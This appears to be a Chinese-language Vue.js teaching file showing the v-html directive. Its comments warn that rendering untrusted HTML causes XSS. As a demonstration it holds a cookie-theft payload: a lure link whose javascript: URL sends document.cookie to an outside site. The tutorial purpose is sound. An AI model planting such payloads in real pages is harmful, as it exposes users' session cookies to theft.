<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>

    <script src = "../lib/dayjs.min.js"></script>
    <script src = "../lib/vue.js"></script>
</head>
<body>

<!--     
    v-html指令：
        1. 作用： 向指定节点中渲染包含html结构的内容
        2. 与插值语法的区别：
            (1) v-html会替换掉节点中所有的内容， {{xxx}}则不会
            (2) v-html 可以识别html结构
        3. 严重注意： v-html有安全性问题!!!
            (1) 在网站上动态渲染任意html是非常危险的，容易导致xss攻击
            (2) 一定要在可信的内容上使用v-html， 永不要用在用户提交的内容上！


    网页打开  => 应用 => Cookie
 -->

    <div id = "demo">
        <div>欢迎来到， {{name}}</div>
        <div v-html = "msg"></div>
        <div v-html = "str"></div>

    </div>

    <script>
        Vue.config.productionTip = false;

        // document.cookie

        const vm = new Vue({
            el: "#demo",
            data: {
                name: "韩信教学",
                msg: "<h3> China’s robotics industry enjoys robust development trend </h3>",
                // str: "<a href = javascript:alert(1)>兄弟我找到一些好看的电影</a>"
                str: "<a href = javascript:location.href = 'https://www.bilibili.com ?' + document.cookie>兄弟我找到一些好看的电影</a>"
            }
        })
    </script>
</body>
</html>
